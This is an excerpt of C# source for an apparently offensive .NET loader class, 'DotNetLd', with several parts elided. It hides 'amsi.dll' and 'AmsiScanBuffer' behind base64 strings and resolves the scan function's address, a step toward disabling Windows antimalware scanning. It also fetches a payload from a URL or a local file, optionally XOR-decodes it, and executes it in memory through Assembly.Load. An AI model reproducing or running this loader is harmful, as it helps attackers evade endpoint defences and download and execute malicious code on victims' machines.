...
public class DotNetLd
{
    ...
    private static IntPtr getAMSILocation()
    {
        ...
        var dll = Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGwK")).Trim();
        var expname = Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXIK")).Trim();
        return fGetProcAddress(fLoadLibrary(dll), expname);
    }
    ...
    private static void TriggerPayload(string payloadPathOrURL, string[] inputArgs, bool xorEncoded, string xorKey, int setProtType = 0)
    {
        ...
        {
            data = downloadURL(payloadPathOrURL);
        }
        else
            data = readLocalFilePath(payloadPathOrURL, FileMode.Open);
 

        if (xorEncoded && !string.IsNullOrEmpty(xorKey))
            data = xorEncDec(data, xorKey);

        var asm = Assembly.Load(data);
        var methodInfo = asm.EntryPoint;
